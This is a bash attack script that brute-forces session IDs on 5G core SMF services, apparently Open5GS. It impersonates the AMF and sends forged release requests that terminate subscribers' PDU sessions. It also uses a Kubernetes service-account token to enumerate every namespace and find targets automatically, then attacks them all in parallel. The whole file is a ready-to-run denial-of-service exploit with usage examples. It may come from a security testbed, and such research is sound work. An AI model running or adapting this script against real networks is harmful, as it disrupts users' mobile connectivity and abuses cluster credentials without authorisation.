#!/usr/bin/env bash
#
# bruteForceAttack.sh
#
# Brute-force attack script for SMF session termination.
# Automatically discovers all SMF SBI services across Kubernetes namespaces
# or accepts a list of explicit SMF service hostnames.
#

set -euo pipefail

# ============================================================================
# CONFIGURATION
# ============================================================================

# Number of session IDs to brute-force (can be overridden via END environment variable)
END=${END:-2000}

# 5G Location Information Parameters (used in attack payload)
# These can be overridden via command-line arguments
MCC=${MCC:-"208"}              # Mobile Country Code
MNC=${MNC:-"93"}               # Mobile Network Code
TAC=${TAC:-"000001"}           # Tracking Area Code
NR_CELL_ID=${NR_CELL_ID:-"000000010"}  # NR Cell ID

# Kubernetes API credentials (automatically mounted by kubelet)
K8S_TOKEN=/var/run/secrets/kubernetes.io/serviceaccount/token
K8S_CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Kubernetes API endpoint
K8S_HOST=${KUBERNETES_SERVICE_HOST:-}
K8S_PORT=${KUBERNETES_SERVICE_PORT:-443}
K8S_API=""
if [ -n "$K8S_HOST" ]; then
  K8S_API="https://${K8S_HOST}:${K8S_PORT}"
fi

# ============================================================================
# USAGE AND HELP
# ============================================================================

function show_usage() {
  cat <<USAGE
Usage: $0 [OPTIONS] [TARGETS]

Brute-force SMF session IDs to trigger session termination.

OPTIONS:
  --auto              Automatically discover all SMF services in the cluster
                      (DEFAULT - used if no other arguments provided)
  --help, -h          Show this help message
  --count N           Number of session IDs to brute-force (default: 2000)
                      Can also set via END environment variable

5G LOCATION PARAMETERS (optional):
  --mcc MCC           Mobile Country Code (default: 208)
  --mnc MNC           Mobile Network Code (default: 93)
  --tac TAC           Tracking Area Code (default: 000001)
  --nrCellId ID       NR Cell ID (default: 000000010)

  These parameters configure the UE location in the attack payload.
  Environment variables: MCC, MNC, TAC, NR_CELL_ID

TARGETS (when --auto is not used):
  List of SMF service hostnames/FQDNs/IPs
  Examples:
    $0 open5gs-smf.default.svc.cluster.local
    $0 open5gs-smf.ns1.svc.cluster.local open5gs-smf.ns2.svc.cluster.local
    $0 192.168.1.100

ENVIRONMENT VARIABLES:
  END                 Number of session IDs to brute-force (default: 2000)
  MCC                 Mobile Country Code (default: 208)
  MNC                 Mobile Network Code (default: 93)
  TAC                 Tracking Area Code (default: 000001)
  NR_CELL_ID          NR Cell ID (default: 000000010)

EXAMPLES:
  # Automatic discovery with default parameters
  $0
  $0 --auto

  # Explicit targets with default parameters
  $0 open5gs-smf.default.svc.cluster.local
  $0 open5gs-smf.ns1.svc.cluster.local open5gs-smf.ns2.svc.cluster.local

  # Custom session ID count
  $0 --count 5000
  END=5000 $0

  # Custom 5G location parameters
  $0 --mcc 310 --mnc 410
  $0 --mcc 208 --mnc 93 --tac 000002 --nrCellId 000000020

  # Mix options with explicit targets
  $0 --count 3000 --mcc 310 --mnc 410 service1 service2

  # Via environment variables
  MCC=310 MNC=410 $0

USAGE
}

# ============================================================================
# KUBERNETES API FUNCTIONS
# ============================================================================

# Make an authenticated API request to the Kubernetes API server
function api_request() {
  local path="$1"
  curl -sS --cacert "$K8S_CA" \
    -H "Authorization: Bearer $(cat "$K8S_TOKEN")" \
    "$K8S_API$path"
}

# Get all namespace names in the cluster
function list_namespaces() {
  api_request "/api/v1/namespaces" | python3 -c \
    'import json,sys; data=json.load(sys.stdin); print("\n".join([item["metadata"]["name"] for item in data["items"]]))'
}

# Get SMF service names in a specific namespace
# Filters services matching "smf" in name or labels
function list_smf_services_in_namespace() {
  local ns="$1"
  api_request "/api/v1/namespaces/${ns}/services" | python3 -c \
    'import json,sys,re
data=json.load(sys.stdin)
for item in data["items"]:
    name = item["metadata"]["name"]
    labels = item["metadata"].get("labels", {})
    # Check if "smf" appears in service name or any label value
    if re.search(r"smf", name, re.I) or any(re.search(r"smf", str(v), re.I) for v in labels.values()):
        print(name)'
}

# ============================================================================
# ATTACK FUNCTIONS
# ============================================================================

# Perform brute-force session ID attack against a single SMF service
# Arguments:
#   $1 - SMF service hostname/FQDN/IP
#   $2 - Number of session IDs to try (END value)
function brute_force() {
  local smf_host="$1"
  local end="$2"
  local i
  local op

  for i in $(seq 1 "$end"); do
    # Send a release request with a brute-forced session ID
    # If the session exists, SMF returns 204 No Content
    # The UE location is configured with MCC, MNC, TAC, and NR Cell ID
    op=$(curl -s -o /dev/null -w "%{http_code}" \
      --request POST \
      -d "{\"ueLocation\":{\"nrLocation\":{\"tai\":{\"plmnId\":{\"mcc\":\"${MCC}\",\"mnc\":\"${MNC}\"},\"tac\":\"${TAC}\"},\"ncgi\":{\"plmnId\":{\"mcc\":\"${MCC}\",\"mnc\":\"${MNC}\"},\"nrCellId\":\"${NR_CELL_ID}\"},\"ueLocationTimestamp\":\"2026-05-29T03:19:48.206301Z\"}},\"ueTimeZone\":\"-05:00\"}" \
      -H "Content-Type: application/json" \
      --http2-prior-knowledge \
      -A "AMF" \
      "http://${smf_host}/nsmf-pdusession/v1/sm-contexts/${i}/release")

    # If HTTP 204, the session was found and terminated
    if [ "$op" = "204" ]; then
      echo
      echo "Time = $(date)"
      echo "Attack successful for session with user context $i"
      echo "Interface-Type = Service-based"
      echo "Interface = AMF-SMF"
      echo "NF Hostname = $smf_host"
    fi
  done
}

# ============================================================================
# DISCOVERY FUNCTIONS
# ============================================================================

# Automatically discover all SMF SBI services across all cluster namespaces
# Returns FQDNs in the format: <service>.<namespace>.svc.cluster.local
function discover_smf_services_auto() {
  local services=()

  # Check if Kubernetes API is available
  if [ -z "$K8S_API" ] || [ ! -f "$K8S_TOKEN" ] || [ ! -f "$K8S_CA" ]; then
    echo "ERROR: Kubernetes service discovery unavailable." >&2
    echo "       Cannot access Kubernetes API." >&2
    return 1
  fi

  # Iterate through all namespaces and collect SMF services
  for ns in $(list_namespaces); do
    for svc in $(list_smf_services_in_namespace "$ns"); do
      services+=("${svc}.${ns}.svc.cluster.local")
    done
  done

  # Check if any services were found
  if [ ${#services[@]} -eq 0 ]; then
    echo "ERROR: No SMF services found in any namespace." >&2
    return 1
  fi

  printf '%s\n' "${services[@]}"
}

# ============================================================================
# MAIN LOGIC
# ============================================================================

function main() {
  local use_auto=false
  local targets=()
  local arg

  # Parse command-line arguments
  while [ $# -gt 0 ]; do
    arg="$1"
    shift

    case "$arg" in
      --auto)
        use_auto=true
        ;;
      --help|-h)
        show_usage
        exit 0
        ;;
      --count)
        if [ $# -eq 0 ]; then
          echo "ERROR: --count requires a value" >&2
          show_usage
          exit 1
        fi
        END="$1"
        shift
        ;;
      --mcc)
        if [ $# -eq 0 ]; then
          echo "ERROR: --mcc requires a value" >&2
          show_usage
          exit 1
        fi
        MCC="$1"
        shift
        ;;
      --mnc)
        if [ $# -eq 0 ]; then
          echo "ERROR: --mnc requires a value" >&2
          show_usage
          exit 1
        fi
        MNC="$1"
        shift
        ;;
      --tac)
        if [ $# -eq 0 ]; then
          echo "ERROR: --tac requires a value" >&2
          show_usage
          exit 1
        fi
        TAC="$1"
        shift
        ;;
      --nrCellId)
        if [ $# -eq 0 ]; then
          echo "ERROR: --nrCellId requires a value" >&2
          show_usage
          exit 1
        fi
        NR_CELL_ID="$1"
        shift
        ;;
      -*)
        echo "ERROR: Unknown option: $arg" >&2
        show_usage
        exit 1
        ;;
      *)
        # Treat as a target SMF service
        targets+=("$arg")
        ;;
    esac
  done

  # Determine if we should use auto-discovery
  # Default to auto if no targets were provided
  if [ ${#targets[@]} -eq 0 ]; then
    use_auto=true
  fi

  # Perform auto-discovery if requested
  if [ "$use_auto" = true ]; then
    echo "Auto-discovering SMF services in the cluster..."
    while IFS= read -r svc; do
      if [ -n "$svc" ]; then
        targets+=("$svc")
      fi
    done < <(discover_smf_services_auto)
  fi

  # Verify we have targets
  if [ ${#targets[@]} -eq 0 ]; then
    echo "ERROR: No SMF services available to attack." >&2
    exit 1
  fi

  echo "Starting brute-force attack against ${#targets[@]} SMF service(s)..."
  echo "Session ID range: 1 to $END"
  echo "5G Location: MCC=$MCC, MNC=$MNC, TAC=$TAC, NR_CELL_ID=$NR_CELL_ID"
  echo "---"

  # Launch brute-force attack in parallel against each SMF service
  for svc in "${targets[@]}"; do
    echo "Attacking: $svc"
    brute_force "$svc" "$END" &
  done

  # Wait for all background jobs to complete
  wait

  echo "---"
  echo "Attack completed."
}

# Run main function with all arguments
main "$@"
